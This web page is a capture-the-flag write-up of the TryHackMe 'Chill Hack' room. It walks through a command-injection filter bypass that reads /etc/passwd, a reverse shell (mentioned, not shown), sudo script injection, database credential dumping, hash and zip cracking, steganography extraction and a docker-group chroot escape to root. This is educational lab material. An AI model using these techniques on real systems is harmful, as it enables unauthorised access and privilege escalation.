<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.226.203| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note." />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/tryhackme/chill-hack/chill-hack/" />


    <title>
        
            Chill Hack :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Chill Hack">
<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.226.203| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="1656"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Chill Hack"/>
<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.226.203| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note."/>



    <meta property="og:title" content="Chill Hack" />
<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.226.203| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/tryhackme/chill-hack/chill-hack/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="TryHackMe" />



    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/tryhackme/chill-hack/chill-hack/">Chill Hack</a></h2>

            
            
            

            <div class="post-content">
                <!-- raw HTML omitted -->
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.226.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt

22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcxgJ3GDCJNTr2pG/lKpGexQ+zhCKUcUL0hjhsy6TLZsUE89P0ZmOoQrLQojvJD0RpfkUkDfd7ut4//Q0Gqzhbiak3AIOqEHVBIVcoINja1TIVq2v3mB6K2f+sZZXgYcpSQriwN+mKgIfrKYyoG7iLWZs92jsUEZVj7sHteOq9UNnyRN4+4FvDhI/8QoOQ19IMszrbpxQV3GQK44xyb9Fhf/Enzz6cSC4D9DHx+/Y1Ky+AFf0A9EIHk+FhU0nuxBdA3ceSTyu8ohV/ltE2SalQXROO70LMoCd5CQDx4o1JGYzny2SHWdKsOUUAkxkEIeEVXqa2pehJwqs0IEuC04sv
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFetPKgbta+pfgqdGTnzyD76mw/9vbSq3DqgpxPVGYlTKc5MI9PmPtkZ8SmvNvtoOp0uzqsfe71S47TXIIiQNxQ=
|   256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHq62Lw0h1xzNV41zO3BsfpOiBI3uy0XHtt6TOMHBhZ

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id="ffuf">ffuf</h3>
<pre tabindex="0"><code>.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
                        [Status: 200, Size: 35184, Words: 16992, Lines: 644]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
secret                  [Status: 301, Size: 315, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
</code></pre><p>Go get <code>note.txt</code> in ftp folder</p>
<pre tabindex="0"><code>Anurodh told me that there is some filtering on strings being put in the command -- Apaar
</code></pre><p>visit <code>secret</code> dir for command execution page</p>
<p>some commands are not allowed&hellip;filter indeed</p>
<p>after some trial and error I found you just have to enclose them with parentheses <code>()</code></p>
<p><code>(cat /etc/passwd)</code></p>
<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false apaar:x:1001:1001:,,,:/home/apaar:/bin/bash anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
</code></pre><p>well&hellip;I tried some commands and seems I can have access..put a simple netcat reverse shell and I am in</p>
<p>Access to <code>home</code> folders and files is very restricted so we need to switch user</p>
<p>let&rsquo;s go back to <code>www</code> folder and enumerate more</p>
<p><code>account.php</code></p>
<pre tabindex="0"><code>&lt;?php

class Account
{
        public function __construct($con)
        {
                $this-&gt;con = $con;
        }
        public function login($un,$pw)
        {
                $pw = hash(&#34;md5&#34;,$pw);
                $query = $this-&gt;con-&gt;prepare(&#34;SELECT * FROM users WHERE username=&#39;$un&#39; AND password=&#39;$pw&#39;&#34;);
                $query-&gt;execute();
                if($query-&gt;rowCount() &gt;= 1)
                {
                        return true;
                }?&gt;
                &lt;h1 style=&#34;color:red&#34;;&gt;Invalid username or password&lt;/h1&gt;
        &lt;?php }
}

?&gt;
</code></pre><p><code>hacker.php</code></p>
<pre tabindex="0"><code>&lt;html&gt;
&lt;head&gt;
&lt;body&gt;
&lt;style&gt;
body {
  background-image: url(&#39;images/002d7e638fb463fb7a266f5ffc7ac47d.gif&#39;);
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
&lt;/style&gt;
&lt;center&gt;
        &lt;img src = &#34;images/hacker-with-laptop_23-2147985341.jpg&#34;&gt;&lt;br&gt;
        &lt;h1 style=&#34;background-color:red;&#34;&gt;You have reached this far. &lt;/h2&gt;
        &lt;h1 style=&#34;background-color:black;&#34;&gt;Look in the dark! You will find your answer&lt;/h1&gt;
&lt;/center&gt;
&lt;/head&gt;
&lt;/html&gt;
</code></pre><p>In the dark?</p>
<p><code>index.php</code></p>
<pre tabindex="0"><code>&lt;html&gt;
&lt;body&gt;
&lt;?php
        if(isset($_POST[&#39;submit&#39;]))
        {
                $username = $_POST[&#39;username&#39;];
                $password = $_POST[&#39;password&#39;];
                ob_start();
                session_start();
                try
                {
                        $con = new PDO(&#34;mysql:dbname=webportal;host=localhost&#34;,&#34;root&#34;,&#34;!@m+her00+@db&#34;);
                        $con-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
                }
                catch(PDOException $e)
                {
                        exit(&#34;Connection failed &#34;. $e-&gt;getMessage());
                }
                require_once(&#34;account.php&#34;);
                $account = new Account($con);
                $success = $account-&gt;login($username,$password);
                if($success)
                {
                        header(&#34;Location: hacker.php&#34;);
                }
        }
?&gt;
&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;style.css&#34;&gt;
        &lt;div class=&#34;signInContainer&#34;&gt;
                &lt;div class=&#34;column&#34;&gt;
                        &lt;div class=&#34;header&#34;&gt;
                                &lt;h2 style=&#34;color:blue;&#34;&gt;Customer Portal&lt;/h2&gt;
                                &lt;h3 style=&#34;color:green;&#34;&gt;Log In&lt;h3&gt;
                        &lt;/div&gt;
                        &lt;form method=&#34;POST&#34;&gt;
                                &lt;?php echo $success?&gt;
                                &lt;input type=&#34;text&#34; name=&#34;username&#34; id=&#34;username&#34; placeholder=&#34;Username&#34; required&gt;
                                &lt;input type=&#34;password&#34; name=&#34;password&#34; id=&#34;password&#34; placeholder=&#34;Password&#34; required&gt;
                                &lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Submit&#34;&gt;
                        &lt;/form&gt;
                &lt;/div&gt;
        &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>hmm..not very useful yet&hellip;went back to <code>apaar</code> home folder</p>
<p>Noticed a <code>.helpline.sh</code> script we can execute</p>
<pre tabindex="0"><code>$ cat .helpline.sh
#!/bin/bash

echo
echo &#34;Welcome to helpdesk. Feel free to talk to anyone at any time!&#34;
echo

read -p &#34;Enter the person whom you want to talk with: &#34; person

read -p &#34;Hello user! I am $person,  Please enter your message: &#34; msg

$msg 2&gt;/dev/null

echo &#34;Thank you for your precious time!&#34;
</code></pre><p>Wait a minute&hellip;</p>
<pre tabindex="0"><code>$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
</code></pre><pre tabindex="0"><code>www-data@ubuntu:/home/apaar$ sudo -u apaar ./.helpline.sh
sudo -u apaar ./.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
test
Hello user! I am test,  Please enter your message: test
test
Thank you for your precious time!
</code></pre><p>we can inject commands in <code>msg</code> parameter  and make a shell spawn</p>
<pre tabindex="0"><code>Enter the person whom you want to talk with: apaar
apaar
Hello user! I am apaar,  Please enter your message: /bin/bash
/bin/bash
whoami
whoami
apaar
</code></pre><p>We are apaar now</p>
<pre tabindex="0"><code>cat local.txt
{USER-FLAG: come_chill_with_us_bro}
</code></pre><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>ok but now it seems to be a dead-end</p>
<p>let&rsquo;s go back to <code>www/files</code> folder and look into the dark&hellip;I guess</p>
<p>Hearing that always make you suspect stegano so I need those images</p>
<pre tabindex="0"><code>apaar@ubuntu:/var/www/files/images$ python3 -m http.server 4444
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.8.226.203 - - [30/Nov/2021 14:00:00] &#34;GET /hacker-with-laptop_23-2147985341.jpg HTTP/1.1&#34; 200 -

└──╼ $wget &#39;http://10.10.176.187:4444/hacker-with-laptop_23-2147985341.jpg&#39;
--2021-11-30 14:57:29--  http://10.10.176.187:4444/hacker-with-laptop_23-2147985341.jpg
Connexion à 10.10.176.187:4444… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 68841 (67K) [image/jpeg]
Sauvegarde en : « hacker-with-laptop_23-2147985341.jpg.1 »

hacker-with-laptop_23-2147985341.jpg.1                     100%[========================================================================================================================================&gt;]  67,23K   135KB/s    ds 0,5s    

2021-11-30 14:57:30 (135 KB/s) — « hacker-with-laptop_23-2147985341.jpg.1 » sauvegardé [68841/68841]
</code></pre><p>Now I try to enumerate that mysql database too</p>
<pre tabindex="0"><code>apaar@ubuntu:/var/www/files/images$ mysql -u root -p
mysql -u root -p
Enter password: !@m+her00+@db

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

No entry for terminal type &#34;unknown&#34;;
using dumb terminal settings.
Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

mysql&gt; show databases
show databases
    -&gt; ;
;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)


mysql&gt; use webportal
use webportal
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables
show tables
    -&gt; ;
;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql&gt; SELECT * FROM users;
SELECT * FROM users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
</code></pre><p>bingo! we know already those are md5 so let&rsquo;s crack &rsquo;em!</p>
<p><code>Aurick : masterpassword</code></p>
<p><code>cullapaar : dontaskdonttell</code></p>
<p>I hope they use those for system too&hellip;nope they aren&rsquo;t</p>
<p>Ok stegano time</p>
<pre tabindex="0"><code>└──╼ $steghide --info hacker-with-laptop_23-2147985341.jpg
&#34;hacker-with-laptop_23-2147985341.jpg&#34;:
  format: jpeg
  capacit�: 3,6 KB
Essayer d&#39;obtenir des informations � propos des donn�es incorpor�es ? (o/n) o
Entrez la passphrase: 
  fichier � inclure &#34;backup.zip&#34;:
    taille: 750,0 Byte
    cryptage: rijndael-128, cbc
    compression: oui

└──╼ $steghide --extract -sf hacker-with-laptop_23-2147985341.jpg
Entrez la passphrase: 
�criture des donn�es extraites dans &#34;backup.zip&#34;.
</code></pre><p>Now let&rsquo;s crack <code>backup.zip</code></p>
<pre tabindex="0"><code>└──╼ $zip2john backup.zip &gt; backup.john
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3

└──╼ $john -w=/usr/share/wordlists/rockyou.txt backup.john
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)
1g 0:00:00:01 DONE (2021-11-30 15:11) 0.6493g/s 7979p/s 7979c/s 7979C/s total90..hawkeye
Use the &#34;--show&#34; option to display all of the cracked passwords reliably
Session completed
</code></pre><p>We get <code>source_code.php</code></p>
<pre tabindex="0"><code>&lt;?php
        if(isset($_POST[&#39;submit&#39;]))
	{
		$email = $_POST[&#34;email&#34;];
		$password = $_POST[&#34;password&#34;];
		if(base64_encode($password) == &#34;IWQwbnRLbjB3bVlwQHNzdzByZA==&#34;)
		{ 
			$random = rand(1000,9999);?&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
			&lt;form method=&#34;POST&#34;&gt;
				Enter the OTP: &lt;input type=&#34;number&#34; name=&#34;otp&#34;&gt;
				&lt;input type=&#34;submit&#34; name=&#34;submitOtp&#34; value=&#34;Submit&#34;&gt;
			&lt;/form&gt;
		&lt;?php	mail($email,&#34;OTP for authentication&#34;,$random);
			if(isset($_POST[&#34;submitOtp&#34;]))
				{
					$otp = $_POST[&#34;otp&#34;];
					if($otp == $random)
					{
						echo &#34;Welcome Anurodh!&#34;;
						header(&#34;Location: authenticated.php&#34;);
					}
					else
					{
						echo &#34;Invalid OTP&#34;;
					}
				}
</code></pre><p>oh <code>anurodh</code>&rsquo;s password&hellip;with extra-steps</p>
<pre tabindex="0"><code>└──╼ $echo IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d
!d0ntKn0wmYp@ssw0rd
</code></pre><p>Shall we FINALLY connect as this guy?</p>
<p>yes we shall!</p>
<p>anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)</p>
<p>Now let&rsquo;s go root&hellip;wait docker? is that common?</p>
<p>Gtfobins said it is NOT</p>
<pre tabindex="0"><code>anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
</code></pre><pre tabindex="0"><code># cat proof.txt


                                        {ROOT-FLAG: why_so_nervous_just_relax_bro}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.&#39; , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.&#39;|    .-,.&#39;|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-&#39; |==|, |   |==|, |           |==|,|   | -|==| , &#39;=&#39;     |==| -   _ |==|    .-&#39;  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  &#39;=&#39;   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  &#39;.=&#39;. -   .&#39; /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----&#39;`--`-----&#39;        `-.`.____.&#39;     `--`--&#39;&#39;   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a
</code></pre><p>that was less chill than expected but definitelly not hard</p>
<p>I read some writeups to check and it seems that you can drop apaar&rsquo;s ssh keys
to connect to the webportal on port <code>9001</code></p>
<p>people mostly found that port using <code>linEnum</code></p>
<p>I try to avoid those scripts as much as possible but they can have their utilty</p>
<p>there is <code>port-forwarding</code> involved in this method so it&rsquo;s very interresting</p>
<p>I recently completed the <code>wreath network</code> room so tis could be extra fun</p>
<p>anyway&hellip;we are done here! Peace out!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/tryhackme/">TryHackMe</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
